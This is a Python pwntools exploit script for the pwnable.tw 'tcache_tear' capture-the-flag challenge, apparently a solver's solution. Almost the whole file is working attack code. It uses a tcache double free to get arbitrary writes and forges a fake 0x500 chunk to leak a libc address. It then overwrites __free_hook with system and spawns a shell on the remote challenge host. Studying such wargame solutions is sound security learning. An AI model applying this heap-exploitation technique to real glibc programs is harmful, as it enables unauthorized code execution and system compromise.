#!/usr/bin/env python3

from pwn import *

binary = "./tcache_tear_patched"
elf = ELF(binary)
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = elf

def conn(debug):
    if debug:
        r = process(binary)
    else:
        r = remote("chall.pwnable.tw", 10207)
    return r

r = conn(0)

def malloc(size, data):
    r.sendafter(b":", b"1") 
    r.sendafter(b":", str(size).encode())
    r.sendafter(b":", data)

def free():
    r.sendafter(b":", b"2")

def evil_write(size, address, data):
    malloc(size, b"B"*4)
    free()
    free()
    malloc(size, p64(address) )
    malloc(size, b"D"*4)
    malloc(size, data )


name = b"A"*0x20
r.sendafter(b"Name:", p64(0x602060)) 

# 00000000000000000 00000000000000021
# 00000000000414141 00000000000000000
# 00000000000000000 00000000000000021
# 00000000000424242 00000000000000000
# 00000000000000000 00000000000000021
# 00000000000434343 00000000000000000
# 00000000000000000 00000000000000031
# 00000000000444444 00000000000000000

# WHY DOES SETTING THE FORWARD CHUNK SIZE TO
# 0X21 WORK ??
evil_write(0x40, 0x602060+0x500-0x10,
        p64(0x0) + p64(0x21) +
        p64(0x0) + p64(0x0) +
        p64(0) + p64(0x21))

evil_write(0x50, 0x602060-0x10,
        p64(0x0) + p64(0x501) +
        p64(0x0) + p64(0x0) +
        p64(0) + p64(0) +
        p64(0) + p64(0x602060))

# now frees the fake chunk
free()
# fd & bk pointers exist in the name vars mem space
# leak libc (aka the fd pointer)
r.sendafter(b":", b"3")
r.recvuntil(b"Name :")
main_arena_leak = int.from_bytes( r.recv(8), "little" )
log.info(f"[MAIN ARENA] {hex(main_arena_leak)}")

# calculate libc base
libc.address = main_arena_leak - libc.symbols["main_arena"] - 0x60
log.info(f"[LIBC BASE] {hex(libc.address)}")

# overwrite the _free_hook address with
# system('/bin/sh')
free_hook = libc.symbols["__free_hook"]
system = libc.symbols["system"]
log.info(f"[__FREE_HOOK] {hex(free_hook)}")

# pop reverse shell
evil_write(0x60, free_hook, p64(system))
malloc(0x60, b"/bin/sh\x00")
free()

r.interactive()
